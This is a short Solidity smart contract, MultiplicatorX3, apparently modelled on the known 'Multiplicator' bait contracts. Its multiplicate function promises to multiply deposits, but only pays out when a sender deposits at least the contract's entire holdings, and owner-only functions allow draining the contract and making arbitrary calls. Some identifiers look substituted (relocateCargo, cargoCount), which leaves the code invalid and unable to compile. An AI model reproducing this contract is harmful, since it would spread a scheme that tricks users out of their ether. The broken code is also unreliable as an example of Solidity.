pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public DepotOwner = msg.sender;

    function() public payable{}

    function deliverGoods()
    payable
    public
    {
        require(msg.sender == DepotOwner);
        DepotOwner.relocateCargo(this.cargoCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == DepotOwner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.cargoCount)
        {
            adr.relocateCargo(this.cargoCount+msg.value);
        }
    }
}